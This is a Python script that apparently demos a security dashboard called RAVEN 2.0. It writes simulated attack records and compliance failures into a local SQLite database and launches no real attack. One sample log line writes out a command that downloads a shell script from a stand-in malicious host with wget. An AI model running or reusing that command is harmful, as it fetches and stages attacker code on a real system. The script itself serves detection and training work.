"""
RAVEN 2.0 - Attack Simulator
Run this in a SEPARATE terminal while RAVEN dashboard is running.
It injects fake attacks into the database so you can watch them appear live.
"""
import time
import sqlite3
import random
from datetime import datetime, timedelta
from pathlib import Path
from colorama import init, Fore

init(autoreset=True)

DB_PATH = Path(__file__).parent / "raven.db"

ATTACKER_IPS = [
    "185.220.101.34", "45.155.205.233", "194.26.29.102",
    "103.75.201.2", "192.168.1.100", "10.0.0.55",
    "91.240.118.172", "178.128.23.9", "23.129.64.130"
]

ATTACK_SCENARIOS = [
    {
        "event_type": "SSH_BRUTE_FORCE",
        "raw_log": "Failed password for root from {ip} port 38291 ssh2",
        "severity": "Critical",
        "ai_analysis": "Multiple rapid-fire SSH login attempts detected from a known malicious IP. This is a credential stuffing attack targeting the root account.",
        "recommendation": "Block IP at firewall immediately. Disable root SSH login. Enable fail2ban."
    },
    {
        "event_type": "PORT_SCAN",
        "raw_log": "SYN scan detected on ports 22,80,443,3306,8080 from {ip}",
        "severity": "High",
        "ai_analysis": "Systematic port enumeration detected. Attacker is mapping your network topology and looking for exposed services.",
        "recommendation": "Enable IDS rules. Rate-limit connections from this source. Review exposed ports."
    },
    {
        "event_type": "MALWARE_DOWNLOAD",
        "raw_log": "wget http://malicious-payload.ru/shell.sh executed by user www-data from {ip}",
        "severity": "Critical",
        "ai_analysis": "Web shell download attempt detected. Attacker has likely exploited a web application vulnerability to gain initial access.",
        "recommendation": "Isolate the web server immediately. Scan for web shells. Patch web application."
    },
    {
        "event_type": "PRIVILEGE_ESCALATION",
        "raw_log": "sudo: user 'guest' NOT in sudoers file. Incident reported from {ip}",
        "severity": "High",
        "ai_analysis": "Unauthorized privilege escalation attempt. A compromised low-privilege account is trying to gain root access.",
        "recommendation": "Lock the guest account. Audit sudoers file. Check for kernel exploits."
    },
    {
        "event_type": "DATA_EXFILTRATION",
        "raw_log": "Unusual outbound transfer: 2.3GB to external IP {ip} on port 443",
        "severity": "Critical",
        "ai_analysis": "Large volume data exfiltration detected over encrypted channel. Possible database dump or sensitive file theft in progress.",
        "recommendation": "Block outbound connection immediately. Investigate source process. Check for compromised credentials."
    },
    {
        "event_type": "HONEYPOT_TRIGGERED",
        "raw_log": "Connection to fake SSH service on port 2222 from {ip} payload: SSH-2.0-libssh",
        "severity": "Medium",
        "ai_analysis": "Honeypot service triggered. Attacker is actively probing decoy services, indicating reconnaissance phase.",
        "recommendation": "Monitor attacker behavior. Add IP to watchlist. No immediate action needed on production systems."
    },
    {
        "event_type": "SUSPICIOUS_LOGIN",
        "raw_log": "Successful login for admin from {ip} at unusual hour (03:42 AM local)",
        "severity": "High",
        "ai_analysis": "After-hours administrative login from an unusual geographic location. Could indicate compromised credentials.",
        "recommendation": "Verify with account owner. Force password reset. Enable MFA if not already active."
    }
]

def _countdown(seconds, message):
    print(f"\n{Fore.CYAN}{message}")
    for i in range(seconds, 0, -1):
        print(f"{Fore.YELLOW}  T-{i}s...", end='\r')
        time.sleep(1)
    print(" " * 30, end='\r')

def run_simulation():
    print(f"""{Fore.RED}
    ╔══════════════════════════════════════════════╗
    ║       RAVEN 2.0 — ATTACK SIMULATOR           ║
    ║  Make sure the dashboard is running first!    ║
    ╚══════════════════════════════════════════════╝
    {Fore.RESET}""")
    
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    # --- WAVE 1: Reconnaissance ---
    print(f"\n{Fore.MAGENTA}━━━ WAVE 1: Reconnaissance & Probing ━━━")
    ip = random.choice(ATTACKER_IPS)
    scenario = ATTACK_SCENARIOS[5]  # HONEYPOT_TRIGGERED
    timestamp = datetime.now().isoformat()
    cursor.execute("""
        INSERT INTO threats (timestamp, source_ip, event_type, raw_log, severity, ai_analysis, recommendation, alerted)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    """, (timestamp, ip, scenario["event_type"], scenario["raw_log"].format(ip=ip), scenario["severity"], scenario["ai_analysis"], scenario["recommendation"], 0))
    
    scenario2 = ATTACK_SCENARIOS[1]  # PORT_SCAN
    ip2 = random.choice(ATTACKER_IPS)
    cursor.execute("""
        INSERT INTO threats (timestamp, source_ip, event_type, raw_log, severity, ai_analysis, recommendation, alerted)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    """, (datetime.now().isoformat(), ip2, scenario2["event_type"], scenario2["raw_log"].format(ip=ip2), scenario2["severity"], scenario2["ai_analysis"], scenario2["recommendation"], 0))
    conn.commit()
    print(f"{Fore.GREEN}  [+] Honeypot triggered from {ip}")
    print(f"{Fore.GREEN}  [+] Port scan detected from {ip2}")
    print(f"{Fore.YELLOW}  >> Check dashboard now — 2 new threat cards should appear!")

    _countdown(8, "Escalating to brute force wave...")

    # --- WAVE 2: Brute Force ---
    print(f"\n{Fore.MAGENTA}━━━ WAVE 2: SSH Brute Force Attack ━━━")
    brute_ip = random.choice(ATTACKER_IPS)
    brute = ATTACK_SCENARIOS[0]  # SSH_BRUTE_FORCE
    base_time = datetime.now()
    for i in range(15):
        t = (base_time + timedelta(seconds=i)).isoformat()
        cursor.execute("""
            INSERT INTO threats (timestamp, source_ip, event_type, raw_log, severity, ai_analysis, recommendation, alerted)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        """, (t, brute_ip, brute["event_type"], brute["raw_log"].format(ip=brute_ip), brute["severity"], brute["ai_analysis"], brute["recommendation"], 0))
    conn.commit()
    print(f"{Fore.RED}  [!] 15 Critical SSH brute force attempts from {brute_ip}")
    print(f"{Fore.YELLOW}  >> Dashboard score will DROP. Telegram alert should fire!")

    _countdown(10, "Deploying advanced persistent threat...")

    # --- WAVE 3: APT Sequence ---
    print(f"\n{Fore.MAGENTA}━━━ WAVE 3: Advanced Persistent Threat ━━━")
    apt_ip = random.choice(ATTACKER_IPS)
    
    for idx in [6, 3, 4]:  # SUSPICIOUS_LOGIN -> PRIVILEGE_ESCALATION -> DATA_EXFILTRATION
        scenario = ATTACK_SCENARIOS[idx]
        t = datetime.now().isoformat()
        cursor.execute("""
            INSERT INTO threats (timestamp, source_ip, event_type, raw_log, severity, ai_analysis, recommendation, alerted)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        """, (t, apt_ip, scenario["event_type"], scenario["raw_log"].format(ip=apt_ip), scenario["severity"], scenario["ai_analysis"], scenario["recommendation"], 0))
        conn.commit()
        print(f"{Fore.RED}  [!] {scenario['event_type']} from {apt_ip} [{scenario['severity']}]")
        time.sleep(2)

    _countdown(8, "Injecting compliance failure...")

    # --- WAVE 4: Compliance Failure ---
    print(f"\n{Fore.MAGENTA}━━━ WAVE 4: Compliance Audit Failure ━━━")
    t = datetime.now().isoformat()
    cursor.execute("""
        INSERT INTO audit_results (check_name, status, detail, timestamp)
        VALUES (?, ?, ?, ?)
    """, ("Windows Firewall", "FAIL", "Firewall service is STOPPED — all ports exposed to network", t))
    cursor.execute("""
        INSERT INTO audit_results (check_name, status, detail, timestamp)
        VALUES (?, ?, ?, ?)
    """, ("Antivirus Status", "FAIL", "No active antivirus detected on system", t))
    conn.commit()
    print(f"{Fore.RED}  [!] Firewall DOWN — compliance failure injected")
    print(f"{Fore.RED}  [!] Antivirus MISSING — compliance failure injected")
    print(f"{Fore.YELLOW}  >> Security Score will drop further!")

    conn.close()

    print(f"""\n{Fore.GREEN}
    ╔══════════════════════════════════════════════╗
    ║            SIMULATION COMPLETE                ║
    ║                                              ║
    ║  ✓ 20 threats injected across 4 waves        ║
    ║  ✓ 2 compliance failures added               ║
    ║  ✓ Check dashboard for live results           ║
    ║  ✓ Check Telegram for critical alerts         ║
    ║  ✓ Try clicking 'Generate PDF' in dashboard   ║
    ╚══════════════════════════════════════════════╝
    {Fore.RESET}""")

if __name__ == "__main__":
    run_simulation()
